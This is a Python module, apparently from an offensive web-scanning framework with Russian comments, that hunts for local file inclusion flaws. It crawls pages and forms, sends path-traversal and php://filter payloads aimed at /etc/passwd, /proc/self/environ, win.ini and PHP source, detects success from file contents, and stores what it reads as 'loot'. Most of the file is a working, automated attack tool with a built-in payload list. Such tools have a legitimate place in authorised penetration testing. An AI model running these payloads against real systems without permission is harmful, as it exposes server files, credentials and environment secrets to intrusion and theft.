"""LFI по явному параметру и формам; подтверждение по содержимому."""

import base64
import binascii
import re

from core.module_base import BaseModule
from modules.web.sqli import load_payloads, web_session
from utils import renderer
from utils.concurrency import threaded_map
from utils.crawl import collect_candidates
from utils.web import WebClient, WebRequestError


DEFAULT_PAYLOADS = [
    "../../../../etc/passwd", "....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "php://filter/convert.base64-encode/resource=index.php",
    "/proc/self/environ", "....\\....\\....\\windows\\win.ini", "/etc/passwd",
    "..\\..\\..\\Windows\\win.ini",
]
FILE_MARKERS = {
    "Linux passwd": r"(?m)^root:[^:\r\n]*:0:0:[^\r\n]*$",
    "Windows win.ini": r"(?im)^\s*\[(?:fonts|extensions)\]\s*$",
}
FILE_NAMES = {"Linux passwd": "/etc/passwd", "Windows win.ini": "win.ini",
              "PHP source (base64)": "index.php", "Process environment": "/proc/self/environ"}


def detect_files(text):
    text = text[:1_000_000]
    found = {name for name, pattern in FILE_MARKERS.items() if re.search(pattern, text)}
    if "\x00" in text and len(re.findall(r"(?:^|\x00)(?:PATH|HOME|USER|SHELL)=[^\x00]+", text)) >= 2:
        found.add("Process environment")
    # Обычный base64 и отражённый путь не доказывают чтение PHP.
    for token in re.findall(r"(?<![A-Za-z0-9+/])[A-Za-z0-9+/]{16,}={0,2}", text):
        try:
            decoded = base64.b64decode(token, validate=True)
        except (binascii.Error, ValueError):
            continue
        if re.search(rb"<\?(?:php\b|=)", decoded, re.I):
            found.add("PHP source (base64)")
            break
    return found


class LFIModule(BaseModule):
    name = "lfi"
    category = "web"
    description = "LFI: явный параметр, ссылки и формы"
    options = {
        "url": {"default": "", "required": False, "description": "Базовый URL без payload; при crawl веб-URL сессии"},
        "param": {"default": "", "required": False, "description": "Явный параметр, например file"},
        "method": {"default": "GET", "required": False, "description": "GET или POST для явного параметра"},
        "payloads_file": {"default": "", "required": False, "description": "Свои payloads вместо встроенных"},
        "crawl": {"default": True, "required": False, "description": "Искать ссылки и формы"},
        "ports": {"default": "", "required": False, "description": "Веб-порты для one-shot"},
        "parameters": {"default": "file,page,path,doc,include,view,template,load,read,document",
                       "required": False, "description": "Подозрительные имена или * для всех"},
        "max_urls": {"default": 10, "required": False, "description": "Лимит кандидатов и страниц"},
        "max_depth": {"default": 1, "required": False, "description": "Глубина обхода"},
        "max_parameters": {"default": 10, "required": False, "description": "Максимум полей кандидата"},
        "threads": {"default": 8, "required": False, "description": "Параллельная проверка параметров (1–64)"},
        "verify": {"default": True, "required": False, "description": "Проверять HTTPS-сертификат"},
    }

    def run(self):
        rows = []
        stats = {"candidates": 0, "tested": 0, "findings": 0}
        self.session.params.setdefault("scan_stats", {})["lfi"] = stats
        payloads = load_payloads(self.get_option("payloads_file"), DEFAULT_PAYLOADS, self.project_dir)
        param = str(self.get_option("param") or "")
        names = {name.strip().lower() for name in str(self.get_option("parameters")).split(",")}
        threads = max(1, min(64, int(self.get_option("threads"))))
        with WebClient(timeout=self.get_option("timeout"), verify=self.get_option("verify")) as client:
            candidates = collect_candidates(web_session(self), client, url=self.get_option("url") or None,
                param=param or None, method=self.get_option("method"), crawl=self.get_option("crawl"),
                max_urls=self.get_option("max_urls"), max_depth=self.get_option("max_depth"),
                lfi_names=None if param else names)
            # Базовую страницу берём один раз на кандидата, затем параметры проверяем параллельно.
            tasks = []
            for candidate in candidates:
                indexes = [index for index, (name, _) in enumerate(candidate.params)
                           if (name == param if param else "*" in names or name.lower() in names)]
                indexes = indexes[:max(1, min(50, self.get_option("max_parameters")))]
                if not indexes:
                    continue
                try:
                    baseline = detect_files(candidate.send(client).text)
                except WebRequestError as exc:
                    renderer.print_warn(str(exc))
                    continue
                stats["candidates"] += len(indexes)
                for index in indexes:
                    tasks.append((candidate, index, baseline))

            def probe(task):
                candidate, index, baseline = task
                for payload in payloads:
                    try:
                        response = candidate.send(client, index, payload)
                    except WebRequestError as exc:
                        renderer.print_warn(str(exc))
                        continue
                    detected = detect_files(response.text) - baseline
                    if detected:
                        return payload, detected
                return None

            for task, result, error in threaded_map(probe, tasks, threads):
                stats["tested"] += 1
                if error is not None:
                    renderer.print_warn(str(error))
                    continue
                if not result:
                    continue
                candidate, index, _ = task
                name = candidate.params[index][0]
                payload, detected = result
                label = ", ".join(sorted(detected))
                stats["findings"] += 1
                rows.append((candidate.url, name, payload, label))
                self.session.add_finding(f"Local file read: {name} → {label}", candidate.url,
                    severity="high", parameter=name, payload=payload, detected=label,
                    method=candidate.method, module=self.path)
                for kind in detected:
                    self.session.add_loot("file", FILE_NAMES[kind], candidate.url)
        renderer.print_table("LFI findings", ["URL", "Parameter", "Payload", "Detected"], rows)
        renderer.print_info(f"Кандидатов: {stats['candidates']}, проверено: {stats['tested']}, уязвимостей: {stats['findings']}")


LFI = LFIModule
